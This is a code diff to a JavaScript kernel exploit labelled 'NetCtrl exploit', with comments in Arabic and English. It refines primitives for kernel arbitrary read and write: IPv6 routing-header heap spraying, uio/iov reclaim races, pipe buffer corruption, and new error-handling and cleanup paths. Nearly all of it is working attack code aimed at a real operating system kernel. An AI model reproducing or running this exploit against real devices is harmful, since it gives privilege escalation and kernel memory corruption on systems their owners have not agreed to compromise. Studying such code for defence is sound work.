@@ -5,7 +5,7 @@ if (typeof libc_addr === 'undefined') {
 }
 include('kernel.js');
 include('binloader.js');
-
+include('stats-tracker.js');
 // ==========================
 // NetCtrl exploit
 // ==========================
@@ -196,7 +196,6 @@ var msg = malloc(MSG_HDR_SIZE);
 var msgIov = malloc(MSG_IOV_NUM * IOV_SIZE);
 var uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE);
 var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);
-var uio_buf = malloc(0x40); // حجم struct uio
 var uio_sock = malloc(8);
 var iov_sock = malloc(8);
 var iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
@@ -208,6 +207,7 @@ var uio_readv_signal_buf = malloc(8 * UIO_THREAD_NUM);
 var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
 var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
 var uio_writev_signal_buf = malloc(8 * UIO_THREAD_NUM);
+var uio_buf = malloc(0x40); // نفس حجم struct uio 
 var spray_ipv6_ready = malloc(8);
 var spray_ipv6_done = malloc(8);
 var spray_ipv6_signal_buf = malloc(8);
@@ -826,7 +826,6 @@ function cleanup() {
   *   Logging Screen
   * ===========================
   */
-log("DEBUG: inside setup_log_screen()", true);
 var LOG_MAX_LINES = 38;
 var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];
 function setup_log_screen() {
@@ -1091,16 +1090,16 @@ function exploit_phase_finish() {
   */
 function setup_arbitrary_rw() {
   // Leak fd_files from kq_fdp.
-  var fd_files = kreadslow64(kq_fdp);
+  var fd_files = kreadslow64_safe(kq_fdp);
   fdt_ofiles = fd_files.add(0x00);
   debug('fdt_ofiles: ' + hex(fdt_ofiles));
-  master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+  master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
   debug('master_r_pipe_file: ' + hex(master_r_pipe_file));
-  victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
+  victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
   debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file));
-  master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00));
+  master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
   debug('master_r_pipe_data: ' + hex(master_r_pipe_data));
-  victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00));
+  victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
   debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data));
 
   // Corrupt pipebuf of masterRpipeFd.
@@ -1225,7 +1224,7 @@ function kwrite32(addr, val) {
   return true;
 }
 function kread64(addr) {
-  return kreadslow64(addr);
+  return kreadslow64_safe(addr);
 }
 function kread32(addr) {
   var buf = kreadslow(addr, 4);
@@ -1507,6 +1506,9 @@ function leak_kqueue() {
   }
   if (count === KQUEUE_ITERATIONS) {
     log('[LEAK] Failed to leak kqueue_fdp after ' + count + ' iterations');
+    if (kq && !kq.eq(BigInt_Error)) {
+      close(kq);
+    }
     return false;
   }
   kl_lock = read64(leak_rthdr.add(0x60));
@@ -1536,32 +1538,38 @@ function kreadslow64(address) {
   var buffer = kreadslow(address, 8);
   if (buffer.eq(BigInt_Error)) {
     log('[KR64] ERROR: kreadslow64 failed at addr: ' + hex(address));
-    return BigInt_Error; // لا cleanup ولا throw – الفلو فوق هو اللي يقرّر
+    // خليه بس يرجّع BigInt_Error، والفلو الأعلى يستخدم kreadslow64_safe لو عايز behavior أصعب
+    return BigInt_Error;
+  }
+  return read64(buffer);
+}
+function kreadslow64_safe(address) {
+  var buffer = kreadslow(address, 8);
+  if (buffer.eq(BigInt_Error)) {
+    log('kreadslow64_safe: kreadslow returned BigInt_Error at addr ' + hex(address));
+    cleanup();
+    throw new Error('Netctrl failed - Reboot and try again');
   }
   return read64(buffer);
 }
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
   // struct uio
-  write64(uio.add(0x00), uio_iov); // uio_iov
-  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
-  write64(uio.add(0x10), new BigInt(0)); // uio_offset
-  write64(uio.add(0x18), size); // uio_resid
-  write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
-  write32(uio.add(0x24), read ? UIO_READ : UIO_WRITE); // uio_rw
-  write64(uio.add(0x28), uio_td); // uio_td
+  write64(uio.add(0x00), uio_iov);          // uio_iov
+  write64(uio.add(0x08), UIO_IOV_NUM);      // uio_iovcnt
+  write64(uio.add(0x10), BigInt_Error);     // uio_offset (زي الأصلي)
+  write64(uio.add(0x18), size);             // uio_resid
+  write32(uio.add(0x20), UIO_SYSSPACE);     // uio_segflg
+  // مهم: نفس منطق الأصلي (read ? UIO_WRITE : UIO_READ)
+  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
+  write64(uio.add(0x28), uio_td);           // uio_td
 
   // أول iovec
-  write64(uio_iov.add(0x00), addr); // iov_base
-  write64(uio_iov.add(0x08), size); // iov_len
+  write64(uio.add(0x30), addr);             // iov_base
+  write64(uio.add(0x38), size);             // iov_len
 }
 function kreadslow(addr, size) {
-  debug('[KR] Enter kreadslow addr=' + hex(addr) + ' size=' + size);
+  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size);
 
-  // تحضير buffers لكل ثريد
-  var leak_buffers = new Array(UIO_THREAD_NUM);
-  for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    leak_buffers[i] = malloc(size);
-  }
   if (!addr || size <= 0) {
     log('[KR] Invalid addr/size');
     return BigInt_Error;
@@ -1570,62 +1578,76 @@ function kreadslow(addr, size) {
     log('[KR] Invalid uio sockets');
     return BigInt_Error;
   }
-  if (safe_memory_available() === 0) {
-    log('[KR] Warning: memory.available == 0 at start, continuing...');
+
+  // Memory exhaustion check (soft)
+  if (debugging.info.memory.available === 0) {
+    log('kreadslow - Memory exhausted before start (soft)');
   }
 
-  // ضبط SO_SNDBUF وتهيئة الـ socket
-  set_sndbuf_raw(new BigInt(uio_sock_1), size);
+  // Prepare leak buffers.
+  var leak_buffers = new Array(UIO_THREAD_NUM);
+  for (var i = 0; i < UIO_THREAD_NUM; i++) {
+    leak_buffers[i] = malloc(size);
+  }
+
+  // Set send buf size.
+  write32(sockopt_val_buf, size);
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
+
+  // Fill queue.
   write(new BigInt(uio_sock_1), tmp, size);
 
-  // نخلي أول iov في uioIovRead بطول size
+  // Set iov length
   write64(uioIovRead.add(0x08), size);
 
-  // Stage1: تجهيز uio في الكيرنل
+  // Stage1: reclaim uio
   free_rthdr(ipv6_socks[triplets[1]]);
   var uio_leak_add = leak_rthdr.add(0x08);
   var count = 0;
   var zeroMemoryCount = 0;
+
   while (count < 10000) {
-    if (count % 500 === 0) {
-      log('[KR] Stage1 progress=' + count);
-      watchdog_tick('kreadslow_stage1');
-    }
+    // في kreadslow
     if (safe_memory_available() === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 8) {
-        log('[KR] Warning: memory.available == 0 in stage1 (soft fail), continuing...');
-        // ما نرجعش Error هنا، نسيب الفشل يتحكم فيه الفلو الأعلى
+        log('kreadslow - memory.available == 0 in stage1 (soft)');
       }
     } else {
       zeroMemoryCount = 0;
     }
     count++;
+    if (count % 500 === 0) {
+      log('[KR] Stage1 progress=' + count);
+      watchdog_tick('kreadslow_stage1');
+    }
+
     trigger_uio_writev();
     sched_yield();
+
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) {
       break;
     }
 
-    // تفريغ الـ socket عشان نكمّل المحاولات
+    // Wake + drain
     read(new BigInt(uio_sock_0), tmp, size);
-    for (var t = 0; t < UIO_THREAD_NUM; t++) {
-      read(new BigInt(uio_sock_0), leak_buffers[t], size);
+    for (var i = 0; i < UIO_THREAD_NUM; i++) {
+      read(new BigInt(uio_sock_0), leak_buffers[i], size);
     }
     wait_uio_writev();
     write(new BigInt(uio_sock_1), tmp, size);
   }
+
   if (count === 10000) {
-    debug('[KR] Stage1 failed after max iterations');
+    debug('kreadslow - Failed uio reclaim after 10000 iterations');
     return BigInt_Error;
   }
 
-  // قراءة عنوان uio_iov من الكيرنل
   var uio_iov = read64(leak_rthdr);
 
-  // بناء struct uio في اليوزر
-  build_uio(uio_buf, uio_iov, 0, true, addr, size);
+  // هنا أهم نقطة: استخدم msgIov زي الأصلي
+  build_uio(uio_buf, uio_iov, 0, true, addr, size);   // read = true
 
   // Stage2: تثبيت uio_segflg = UIO_SYSSPACE
   free_rthdr(ipv6_socks[triplets[2]]);
@@ -1636,13 +1658,16 @@ function kreadslow(addr, size) {
     count2++;
     if (count2 > 10000) {
       log('[KR] Stage2 failed after max iterations');
+      // زي الأصلي: قبل ما نرجع Error ننضف iov loop لو لسه شغّال
+      write(new BigInt(iov_sock_1), tmp, 1);
+      wait_iov_recvmsg();
+      read(new BigInt(iov_sock_0), tmp, 1);
       return BigInt_Error;
     }
     if (safe_memory_available() === 0) {
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= 8) {
         log('[KR] Warning: memory.available == 0 in stage2 (soft fail), continuing...');
-        // برضه ما نرجعش Error هنا مباشرة
       }
     } else {
       zeroMemoryCount2 = 0;
@@ -1670,24 +1695,39 @@ function kreadslow(addr, size) {
       leak_buffer = leak_buffers[j];
     }
   }
+
+  // Workers should have finished earlier no need to wait
   wait_uio_writev();
+
+  // Release iov spray.
   write(new BigInt(iov_sock_1), tmp, 1);
+
   if (leak_buffer.eq(new BigInt(0))) {
     log('[KR] No valid leak_buffer found (all buffers matched tag)');
+    // زي الأصلي: نضمن iov loop اتقفل
+    wait_iov_recvmsg();
+    read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
+
+  // Find triplets[2]
   for (var retry = 0; retry < 3; retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
     sched_yield();
   }
   if (triplets[2] === -1) {
+    log('[KR] Failed to find triplets[2]');
+    wait_iov_recvmsg();
+    read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
+
   return leak_buffer;
 }
 function kwriteslow(addr, buffer, size) {
-  log('[KW] Enter kwriteslow addr=' + hex(addr));
+  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size);
+
   if (!addr || size <= 0) {
     log('[KW] Invalid addr/size');
     return BigInt_Error;
@@ -1696,104 +1736,130 @@ function kwriteslow(addr, buffer, size) {
     log('[KW] Invalid uio sockets');
     return BigInt_Error;
   }
-  if (safe_memory_available() === 0) {
-    log('[KW] Warning: memory.available == 0 at start, continuing...');
+
+  if (debugging.info.memory.available === 0) {
+    log('kwriteslow - Memory exhausted before start (soft)');
   }
 
-  // ضبط SO_SNDBUF وتهيئة الـ socket
+  // Set send buf size.
   write32(sockopt_val_buf, size);
-  set_sndbuf_raw(new BigInt(uio_sock_1), size);
-  write(new BigInt(uio_sock_1), tmp, size);
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
 
-  // Set iov length
+  // Set iov length.
   write64(uioIovWrite.add(0x08), size);
 
-  // Stage1: تجهيز uio في الكيرنل
+  // Stage1: reclaim uio
   free_rthdr(ipv6_socks[triplets[1]]);
   var uio_leak_add = leak_rthdr.add(0x08);
-  var count = 0;
   var zeroMemoryCount = 0;
+  var count = 0;
+
   while (true) {
-    if (count % 500 === 0) {
-      log('[KW] Stage1 progress=' + count);
-      watchdog_tick('kwriteslow_stage1');
-    }
+    // في kreadslow
     if (safe_memory_available() === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 8) {
-        log('[KW] Warning: memory.available == 0 in stage1 (soft fail), continuing...');
+        log('kwriteslow - memory.available == 0 in stage1 (soft)');
       }
     } else {
       zeroMemoryCount = 0;
+    }
+
+    if (count % 500 === 0) {
+      log('[KW] Stage1 progress=' + count);
+      watchdog_tick('kwriteslow_stage1');
     }
     count++;
     if (count > 10000) {
       log('[KW] Stage1 failed after max iterations');
       return BigInt_Error;
     }
+
     trigger_uio_readv();
     sched_yield();
+
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) {
       break;
     }
+
     for (var i = 0; i < UIO_THREAD_NUM; i++) {
       write(new BigInt(uio_sock_1), buffer, size);
     }
     wait_uio_readv();
   }
-  var uio_iov = read64(leak_rthdr);
-  build_uio(uio_buf, uio_iov, 0, false, addr, size);
 
-  // Stage2: تثبيت uio_segflg = UIO_SYSSPACE
+  var uio_iov = read64(leak_rthdr);
+
+  // برضه هنا استخدم msgIov زي الأصلي
+  build_uio(uio_buf, uio_iov, 0, false, addr, size);  // write = false
+
+  // Stage2: reclaim iov
   free_rthdr(ipv6_socks[triplets[2]]);
   var iov_leak_add = leak_rthdr.add(0x20);
-  var count2 = 0;
   var zeroMemoryCount2 = 0;
+  var count2 = 0;
+
   while (true) {
-    if (count2 % 500 === 0) {
-      log('[KW] Stage2 progress=' + count2);
-      watchdog_tick('kwriteslow_stage2');
-    }
-    if (safe_memory_available() === 0) {
+    if (debugging.info.memory.available === 0) {
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= 8) {
-        log('[KW] Warning: memory.available == 0 in stage2 (soft fail), continuing...');
+        log('kwriteslow - memory.available == 0 in stage2 (soft)');
       }
     } else {
       zeroMemoryCount2 = 0;
     }
+
+    if (count2 % 500 === 0) {
+      log('[KW] Stage2 progress=' + count2);
+      watchdog_tick('kwriteslow_stage2');
+    }
     count2++;
     if (count2 > 10000) {
       log('[KW] Stage2 failed after max iterations');
+      write(new BigInt(iov_sock_1), tmp, 1);
+      wait_iov_recvmsg();
+      read(new BigInt(iov_sock_0), tmp, 1);
       return BigInt_Error;
     }
+
     trigger_iov_recvmsg();
     sched_yield();
+
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
     if (read32(iov_leak_add) === UIO_SYSSPACE) {
       break;
     }
+
     write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
   }
 
-  // Corrupt data
+  // Corrupt data.
   for (var j = 0; j < UIO_THREAD_NUM; j++) {
     write(new BigInt(uio_sock_1), buffer, size);
   }
+
   triplets[1] = find_triplet(triplets[0], -1);
+
   wait_uio_readv();
   write(new BigInt(iov_sock_1), tmp, 1);
+
   for (var retry = 0; retry < 3; retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
     sched_yield();
   }
   if (triplets[2] === -1) {
+    log('[KW] Failed to find triplets[2]');
+    wait_iov_recvmsg();
+    read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
+
+  wait_iov_recvmsg();
+  read(new BigInt(iov_sock_0), tmp, 1);
   return new BigInt(0);
 }
 /* ===========================
